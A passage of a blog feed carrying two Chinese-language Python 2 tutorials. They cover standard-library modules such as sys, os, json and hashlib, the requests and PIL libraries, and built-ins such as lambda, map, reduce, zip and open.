    <published>2018-08-15T12:55:29.000Z</published>
    <updated>2018-08-15T16:23:29.467Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="常用的系统库"><a href="#常用的系统库" class="headerlink" title="常用的系统库"></a>常用的系统库</h1><p>Python 的标准库包括了很多的模块, 从 Python 语言自身特定的类型和声明, 到一些只用于少数程序的不著名的模块.</p><h3 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h3><p>可以通过help命令查看其文档</p><p>sys.argv是变量，命令行参数，专门向Python解释器传递参数他的功能是获取程序外部向程序传递的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import sys</span><br><span class="line">print &quot;THIS FILE NAME IS:&quot;,sys.argv[0]</span><br></pre></td></tr></table></figure></p><p>结果是<code>THIS FILE NAME IS: D:/yinjijn.py</code></p><p>sys.stdin,sys.stdout,sys.stderr<br>处理标准输入，标准输出，标准错误</p><p>输出和错误是内建在每个unix系统中的管道<br>print的本质就是sys.stdout.write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">for i in range(6):</span><br><span class="line">    print &quot;attck&quot;</span><br></pre></td></tr></table></figure></p><p>等同于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import  sys</span><br><span class="line">for i in range(6):</span><br><span class="line">    sys.stdout.write(&quot;just do it\n&quot;)</span><br></pre></td></tr></table></figure></p><p>stdout是一个类文件对象，调用了它的write函数就可以打印任何的字符串了，它不会自己添加回车，要我们添加\n但是只有write的办法，木有read的方法<br>是由于是类文件对象，因此你可以将任何类文件赋值，然后重定向输出</p><h3 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a><strong>os模块</strong></h3><p>常用的几个</p><p>import os</p><p>os.name      #判断现在正在实用的平台，Windows平台”nt”,linux平台”posix”</p><p>os.getcwd()        #获取当前目录</p><p>os.listdir(“D:/blog”)         #列D:/blog文件夹的目录</p><p>os.mkdir(“D:/gooann”)        #在本文件x夹下建立一个叫gooann的文件夹</p><p>os.listdir(“D:/gooann/items”)  #查看目录文件夹</p><p> os.rmdir(“blog”) #删除叫blog的文件夹</p><p>os.rename(“test.txt”,”test1.txt”) #将test.txt重名为test1.txt</p><p>os.remove(“test1.txt”)  #删除test1.txt的文件</p><p>os库提供了在Python中使用操作系统的命令的方法就是用os.system(）</p><h3 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a><strong>time模块</strong></h3><p>time模块很常用的，可以精确的知道程序的运行长短，看看常用的 </p><p>import time</p><p>time.time()   #获取当前时间的时间戳</p><p>1503480040.985</p><p> time.clock()  #获取进程的时间</p><p>60.641674890547975</p><p> time.localtime()  #时间戳转换成当地的时间</p><p>time.struct_time(tm_year=2017, tm_mon=8, tm_mday=23, tm_hour=17, tm_min=20, tm_sec=48, tm_wday=2, tm_yday=235, tm_isdst=0)</p><p>time.asctime()  #将元祖表示为’Wed Aug 23 17:24:07 2017’这种形式</p><h3 id="json模块"><a href="#json模块" class="headerlink" title="json模块"></a>json模块</h3><p>传递数据的XML和JSON</p><p>JSON(JavaScript Object Notation, JS 对象标记) 是一种轻量级的数据交换格式。它基于 ECMAScript (w3c制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>Python标准库中有JSON模块，主要是两个功能，序列化(encoding)与反序列化(decoding)</p><h5 id="encoding操作-dumps"><a href="#encoding操作-dumps" class="headerlink" title="encoding操作 :dumps()"></a>encoding操作 :dumps()</h5><p>#encoding=utf-8<br>import json<br>data = [{“username”:”gooann”,”password”:”shiqian”,”content”:(“shiqian”,”secer”)}]<br>print data<br>[{‘username’: ‘gooann’, ‘content’: (‘shiqian’, ‘secer’), ‘password’: ‘shiqian’}]<br>data_json = json.dumps(data)  #将data进行格式的编码转换<br>print data_json<br>[{“username”: “gooann”, “content”: [“shiqian”, “secer”], “password”: “shiqian”}]</p><p>这里的data_json是str类型，data是list类型</p><h5 id="decoding操作：loads"><a href="#decoding操作：loads" class="headerlink" title="decoding操作：loads()"></a>decoding操作：loads()</h5><p>data_load = json.loads(data_json)<br>print data_load</p><p>[{u’username’: u’gooann’, u’content’: [u’shiqian’, u’secer’], u’password’: u’shiqian’}]</p><h3 id="hashlib模块"><a href="#hashlib模块" class="headerlink" title="hashlib模块"></a>hashlib模块</h3><p>Python中的hashlib库提供了大量的摘要算法，又叫散列算法，哈希算法</p><p>口算一下MD5</p><p>#encoding=utf-8<br>import hashlib<br>md5 = hashlib.md5( )<br>md5.update(‘admin’)<br>print md5.hexdigest( )</p><p>21232f297a57a5a743894a0e4a801fc3</p><h3 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a><strong>random模块</strong></h3><p>就是生成随机数的</p><p>#encoding=utf-8<br>import random<br>random.random()  #生成大于等于0，小于等于1的随机浮点数<br>random.uniform(66,88)  #生成66到88之间的随机浮点数<br>80.51121638510607<br>random.randint(66,88)  #生成66到88的整数<br>88<br>random.choice(‘url’) #在url生成随机字符<br>‘u’<br>look = [1,2,3,4,5,6]<br>random.shuffle(look)  #打乱数字<br>look<br>[1, 4, 3, 5, 2, 6]</p><h1 id="常用的第三方库"><a href="#常用的第三方库" class="headerlink" title="常用的第三方库"></a>常用的第三方库</h1><p>第三方库顾名思义，得下载安装</p><p>安装第三方库</p><h5 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h5><p>用源码安装，去哪找呢？百度，谷歌，GitHub下载，下载好了压缩包，解压<br>LINUX或者MAC就直接git clone，然后进入目录，大部分都是都有setup.py，然后执行命令</p><p><code>python setup.py install</code></p><p>如果是Windows系统</p><p>打开目录，然后shift+右键，在此打开cmd/Powershell窗口，打开，然后执行命令</p><p><code>python setup.py install</code></p><h5 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h5><p>pip安装或者easy_install安装<br>简单粗暴，他们的第三方库都来自一个网站：<a href="http://pypi.python.org/pypi" target="_blank" rel="noopener">http://pypi.python.org/pypi</a><br>pip也要安装unix平台<br>$ sudo yum install python-pip<br>$ sudo apt-get install python-pip</p><p>Windows平台<br>可以下载get-pip.py<br>地址：<a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a><br>然后python get-pip.py</p><p>unix也可以用这种方法, pip install 第三方库的名称</p><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><p>用于程序进行http协议的get和post的模块 </p><h5 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h5><p>尝试获取某个页面，得到了一个请求实例</p><p>#encoding=utf-8<br>import requests<br>url = requests.get(“<a href="http://www.gooann.com&quot;" target="_blank" rel="noopener">http://www.gooann.com&quot;</a>)</p><p>获取cookies       print url.cookies</p><p>获取头部信息        url.headers</p><p>http响应状态码       url.status_code</p><p>网页内容              url.text</p><p>以二进制的方式打开服务器并返回数据      url.content</p><h5 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h5><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}</p><p> r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>, data=payload)</p><p> print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {<br>    “key1”: “value1”,<br>    “key2”: “value2”<br>  },<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “23”,<br>    “Content-Type”: “application/x-www-form-urlencoded”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>没有data参数</p><p>r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>)</p><p>print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {},<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “0”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>当data被赋值了之后，结果中才会多了form值，而form值就是post给服务器的内容</p><h3 id="PIL模块"><a href="#PIL模块" class="headerlink" title="PIL模块"></a>PIL模块</h3><p>python Imaging Library (PIL)是PythonWare公司提供的免费的图像处理工具包，是python下的图像处理模块，支持多种格式，并提供强大的图形与图像处理功能。</p><p>安装：UNIX平台<br>sudo apt-get install python-imaging<br>MAC平台<br>sudo easy_install PIL<br>Windows：<br>去官网直接下载exe安装，傻瓜式操作，传送门:<a href="http://pythonware.com/products/pil/" target="_blank" rel="noopener">http://pythonware.com/products/pil/</a></p><p>#####</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-2</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-2/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-2/</id>
    <published>2018-08-15T07:32:29.000Z</published>
    <updated>2018-08-15T12:40:43.561Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="理解Python函数"><a href="#理解Python函数" class="headerlink" title="理解Python函数"></a>理解Python函数</h1><p>在高中时代，就可以这么定义函数—–f(x)=8x+8 </p><p>在函数中，并没有规定函数是一个数，它可是任何东西，你想是啥就是啥，变量的本质，可以当作一个占位符</p><h1 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h1><p>代码块以 def 关键词开头，def这个简写来自define，后接函数标识符名称和圆括号()。<br>定义函数内容以冒号起始，然后必须缩进（四个空格或者一个tab键）</p><p>def 函数名(参数):<br>        函数体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">def    geturl( ):</span><br><span class="line"></span><br><span class="line">​           print   &quot;get  it&quot;</span><br><span class="line"></span><br><span class="line">geturl( )</span><br></pre></td></tr></table></figure></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>一般情况，要将返回的值传给一个变量，然后通过变量打印出来，如果没有，那就没有回显了</p><h1 id="全局变量and局部变量"><a href="#全局变量and局部变量" class="headerlink" title="全局变量and局部变量"></a>全局变量and局部变量</h1><p>局部变量：只在函数体内（某个范围内）起作用的就叫局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><p>全局变量：在函数的内外都能用，变量前加global<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        global a</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><h1 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h1><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def add(x,y):</span><br><span class="line">      a = x+y</span><br><span class="line">      print a</span><br><span class="line"></span><br><span class="line">add（3,5）</span><br></pre></td></tr></table></figure><p>引入lambda函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add = lambda  x,y  :  x+y</span><br><span class="line"></span><br><span class="line">add( 3,5 )</span><br></pre></td></tr></table></figure></p><p>lambda函数是一个只用一行就能解决问题的函数。</p><h5 id="lambda函数的使用方法："><a href="#lambda函数的使用方法：" class="headerlink" title="lambda函数的使用方法："></a>lambda函数的使用方法：</h5><p>在lambda函数后面直接加变量，变量后直接冒号，冒号后面是表达式，完美解决<br>来个表达式</p><p>lambda arg1,arg2,….,argn : expression using arguments</p><h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><h5 id="使用方法：-map-函数，序列对象"><a href="#使用方法：-map-函数，序列对象" class="headerlink" title="使用方法： map(函数，序列对象)"></a>使用方法： map(函数，序列对象)</h5><p>比如0-100的平方数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(101)</span><br><span class="line"></span><br><span class="line">map( lambda  x :  x**2,numbers)</span><br></pre></td></tr></table></figure></p><p>另一个方法 <code>[ x**2  for  x  in  numbers ]</code></p><h3 id="reduce函数"><a href="#reduce函数" class="headerlink" title="reduce函数"></a>reduce函数</h3><p>reduce()函数也是Python内置的一个高阶函数。</p><p>reduce()函数接收的参数和 map()类似，一个函数 f，一个list，但行为和 map()不同，reduce()传入的函数 f 必须接收两个参数，reduce()对list的每个元素反复调用函数f，并返回最终结果值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x, y):</span><br><span class="line">    return x + y</span><br></pre></td></tr></table></figure></p><p>调用 <strong>reduce(f, [1, 3, 5, 7, 9])</strong>时，reduce函数将做如下计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先计算头两个元素：f(1, 3)，结果为4；</span><br><span class="line">再把结果和第3个元素计算：f(4, 5)，结果为9；</span><br><span class="line">再把结果和第4个元素计算：f(9, 7)，结果为16；</span><br><span class="line">再把结果和第5个元素计算：f(16, 9)，结果为25；</span><br><span class="line">由于没有更多的元素了，计算结束，返回结果25。</span><br></pre></td></tr></table></figure></p><p>reduce()还可以接收第3个可选参数，作为计算的初始值。如果把初始值设为100，计算：</p><p>reduce(f, [1,3,5,7,9], 100)</p><p>结果将变为125，因为第一轮计算是：</p><p>计算初始值和第一个元素：f(100, 1)，结果为101。</p><h3 id="filter函数-过滤器"><a href="#filter函数-过滤器" class="headerlink" title="filter函数:过滤器"></a>filter函数:过滤器</h3><h5 id="用法：filter-函数-序列对象"><a href="#用法：filter-函数-序列对象" class="headerlink" title="用法：filter(函数,序列对象)"></a>用法：filter(函数,序列对象)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(-2,11)</span><br><span class="line"></span><br><span class="line">print   numbers</span><br><span class="line"></span><br><span class="line">[-2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br><span class="line"></span><br><span class="line">filter( lambda x:x&gt;5,numbers)</span><br><span class="line"></span><br><span class="line">[6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure><h3 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h3><p>zip()是Python的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）。若传入参数的长度不等，则返回list的长度和参数中长度最短的对象相同。利用*号操作符，可以将list unzip（解压）。</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3]</span><br><span class="line"></span><br><span class="line">b = [4,5,6]</span><br><span class="line"></span><br><span class="line"> zip(a,b)</span><br><span class="line"></span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br></pre></td></tr></table></figure></p><h5 id="长度不等时，取长度最小的"><a href="#长度不等时，取长度最小的" class="headerlink" title="长度不等时，取长度最小的"></a>长度不等时，取长度最小的</h5><p>c = ‘HELL0’</p><p> d = ‘look’</p><p>zip(c,d)</p><p>[(‘H’, ‘l’), (‘E’, ‘o’), (‘L’, ‘o’), (‘L’, ‘k’)</p><h5 id="常用的是构造字典"><a href="#常用的是构造字典" class="headerlink" title="常用的是构造字典"></a>常用的是构造字典</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url1 =  [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]</span><br><span class="line"></span><br><span class="line">url2 =  [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;]</span><br><span class="line"></span><br><span class="line">url3 =  zip(url1,url2)</span><br></pre></td></tr></table></figure><h3 id="abs函数"><a href="#abs函数" class="headerlink" title="abs函数"></a>abs函数</h3><h5 id="abs-函数返回数字的绝对值。"><a href="#abs-函数返回数字的绝对值。" class="headerlink" title="abs() 函数返回数字的绝对值。"></a>abs() 函数返回数字的绝对值。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">print &quot;abs(-45) : &quot;, abs(-45)</span><br><span class="line">print &quot;abs(100.12) : &quot;, abs(100.12)</span><br><span class="line">print &quot;abs(119L) : &quot;, abs(119L)</span><br></pre></td></tr></table></figure><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abs(-45) :  45</span><br><span class="line">abs(100.12) :  100.12</span><br><span class="line">abs(119L) :  119</span><br></pre></td></tr></table></figure></p><h3 id="divmod-函数"><a href="#divmod-函数" class="headerlink" title="divmod() 函数"></a>divmod() 函数</h3><p>python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b)。</p><h5 id="divmod-a-b"><a href="#divmod-a-b" class="headerlink" title="divmod(a, b)"></a>divmod(a, b)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">divmod(7, 2)</span><br><span class="line"></span><br><span class="line">(3, 1)</span><br><span class="line"></span><br><span class="line">divmod(8, 2)</span><br><span class="line"></span><br><span class="line">(4, 0)</span><br></pre></td></tr></table></figure><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input() 函数"></a>input() 函数</h3><p>Python3.x 中 input() 函数接受一个标准输入数据，返回为 string 类型。</p><p>Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入。</p><p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input() 直接读取控制台的输入（任何类型的输入它都可以接收）除非对 input() 有特别需要，否则一般情况下推荐使用 raw_input() 来与用户交互。</p><h5 id="input-prompt"><a href="#input-prompt" class="headerlink" title="input([prompt])"></a>input([prompt])</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = input(&quot;input:&quot;)</span><br><span class="line"></span><br><span class="line">input:123  </span><br><span class="line"></span><br><span class="line">type(a)   </span><br><span class="line"></span><br><span class="line">type &apos;int&apos;</span><br></pre></td></tr></table></figure><h3 id="open-函数"><a href="#open-函数" class="headerlink" title="open() 函数"></a>open() 函数</h3><p>open() 函数用于打开一个文件，创建一个 file 对象，相关的方法才可以调用它进行读写。</p><h5 id="open（“-name”-”mode”）"><a href="#open（“-name”-”mode”）" class="headerlink" title="open（“$name”,”mode”）"></a>open（“$name”,”mode”）</h5><h5 id="file-对象方法"><a href="#file-对象方法" class="headerlink" title="file 对象方法"></a>file 对象方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file.read([size]) size未指定则返回整个文件,如果文件大小&gt;2倍内存则有问题.f.read()读到文件尾时返回&quot;&quot;(空字串)</span><br><span class="line"></span><br><span class="line">file.readline() 返回一行</span><br><span class="line"></span><br><span class="line">file.readlines([size]) 返回包含size行的列表,size 未指定则返回全部行</span><br><span class="line"></span><br><span class="line">for line in f: print line #通过循环访问</span><br><span class="line"></span><br><span class="line">f.write(&quot;hello\n&quot;) #如果要写入字符串以外的数据,先将他转换为字符串.</span><br><span class="line"></span><br><span class="line">f.tell() 返回一个整数,表示当前文件指针的位置(就是到文件头的比特数).</span><br><span class="line"></span><br><span class="line">f.close() 关闭文件</span><br></pre></td></tr></table></figure><h3 id="staticmethod-函数"><a href="#staticmethod-函数" class="headerlink" title="staticmethod() 函数"></a>staticmethod() 函数</h3><p>python staticmethod 返回函数的静态方法。</p><p>该方法不强制要求传递参数</p><h3 id="all-函数"><a href="#all-函数" class="headerlink" title="all() 函数"></a>all() 函数</h3><p>all() 函数用于判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False。</p><p>元素除了是 0、空、FALSE 外都算 TRUE。iterable – 元组或列表。</p><h5 id="比如"><a href="#比如" class="headerlink" title="比如"></a>比如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;])  # 列表list，元素都不为空或0</span><br><span class="line"></span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;&apos;, &apos;d&apos;])   # 列表list，存在一个为空的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">all((0, 1, 2, 3))          # 元组tuple，存在一个为0的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"> all([])             # 空列表</span><br><span class="line"></span><br><span class="line">True </span><br><span class="line"></span><br><span class="line">all(())             # 空元组</span><br><span class="line"></span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="enumerate-函数"><a href="#enumerate-函数" class="headerlink" title="enumerate() 函数"></a>enumerate() 函数</h3><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p><p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seasons = [&apos;Spring&apos;, &apos;Summer&apos;, &apos;Fall&apos;, &apos;Winter&apos;]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons))</span><br><span class="line"></span><br><span class="line">[(0, &apos;Spring&apos;), (1, &apos;Summer&apos;), (2, &apos;Fall&apos;), (3, &apos;Winter&apos;)]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons, start=1))       # 小标从 1 开始</span><br><span class="line">[(1, &apos;Spring&apos;), (2, &apos;Summer&apos;), (3, &apos;Fall&apos;), (4, &apos;Winter&apos;)]</span><br></pre></td></tr></table></figure></p><h3 id="tuple-方法"><a href="#tuple-方法" class="headerlink" title="tuple()方法"></a>tuple()方法</h3><p>元组 tuple() 函数将列表转换为元组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tuple(&#123;1:2,3:4&#125;)    #针对字典 会返回字典的key组成的tuple</span><br><span class="line"></span><br><span class="line">(1, 3)</span><br><span class="line"></span><br><span class="line">tuple([1,2,3,4])</span><br><span class="line"></span><br><span class="line">(1, 2, 3, 4)</span><br></pre></td></tr></table></figure></p><h3 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile() 函数"></a>compile() 函数</h3><p>compile() 函数将一个字符串编译为字节代码。</p><h5 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h5><p>返回表达式执行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;3 * 4 + 5&quot;</span><br><span class="line"></span><br><span class="line">a = compile(str,&apos;&apos;,&apos;eval&apos;)</span><br><span class="line"></span><br><span class="line">eval(a)</span><br></pre></td></tr></table></figure></p><h3 id="dict-函数"><a href="#dict-函数" class="headerlink" title="dict() 函数"></a>dict() 函数</h3><p>dict() 函数用于创建一个字典。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dict()                        # 创建空字典</span><br><span class="line"></span><br><span class="line"> dict(a=&apos;a&apos;, b=&apos;b&apos;, t=&apos;t&apos;)     # 传入关键字</span><br><span class="line"></span><br><span class="line">dict(zip([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;], [1, 2, 3]))   # 映射函数方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125; </span><br><span class="line"></span><br><span class="line">dict([(&apos;one&apos;, 1), (&apos;two&apos;, 2), (&apos;three&apos;, 3)])    # 可迭代对象方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="file函数"><a href="#file函数" class="headerlink" title="file函数"></a>file函数</h3><p><strong>file()</strong> 函数用于创建一个 file 对象，它有一个别名叫open()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 